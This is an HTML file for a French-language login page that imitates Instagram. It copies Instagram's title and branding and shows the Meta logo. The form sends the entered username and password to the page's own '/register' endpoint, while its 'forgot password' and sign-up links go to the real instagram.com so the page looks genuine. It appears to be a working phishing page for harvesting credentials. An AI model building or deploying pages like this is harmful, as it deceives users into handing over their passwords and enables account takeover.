<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Connexion • instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
        <link rel="icon" type="image/png" href="./image/icons8-instagram-96.png">
</head>
<body class="bg-gray-800 flex flex-col overflow-hidden h-[100dvh]">

    <!-- ZONE HAUT -->
    <div class="pt-4 flex flex-col items-center">
        <p class="text-white mb-10">Français (France)</p>
        <img src="./image/svgviewer-output.svg" class="w-[70px] mt-10 " alt="Logo">
    </div>

    <!-- ZONE MILIEU -->
    <div class="flex-1 flex flex-col justify-center items-center px-4">

        <form action="/register" method="POST" class="flex flex-col gap-5 w-full max-w-[450px]">

            <input 
                name="username"
                type="text" 
                class="p-3 bg-gray-800 text-white border border-gray-400 rounded-lg"
                placeholder="Téléphone, nom d’utilisateur ou e-mail"
                required
            >

            <input 
                name="email"
                type="password" 
                class="p-3 bg-gray-800 text-white border border-gray-400 rounded-lg"
                placeholder="Mot de passe"
                required
            >

            <button 
                type="submit"
                class="bg-blue-600 text-white p-2 rounded-2xl w-full text-xl"
            >
                S'inscrire
            </button>
            <a href="https://www.instagram.com/accounts/password/reset/" class="text-center text-white">Mot de passe oublié ?</a>

        </form>
    </div>

    <!-- ZONE BAS (REMONTÉE POUR ÊTRE VISIBLE SUR MOBILE) -->
    <div class="pb-8 flex flex-col items-center text-white w-full max-w-[450px] mx-auto">

        <!--<button class="p-3 text-blue-400 border border-blue-400 rounded-[30px] w-full">
            Créer un compte ?
        </button>-->
        <a href="https://www.instagram.com/accounts/emailsignup/" class="p-3 text-blue-400 border border-blue-400 rounded-[30px] w-full text-center">Créer un compte ?</a>
        
        <div class="flex items-center gap-2 mt-6">
            <img src="./image/svgviewer-output (1).svg" class="w-[40px]" alt="Meta">
            <h1>Meta</h1>
        </div>
    </div>

</body>

</html>
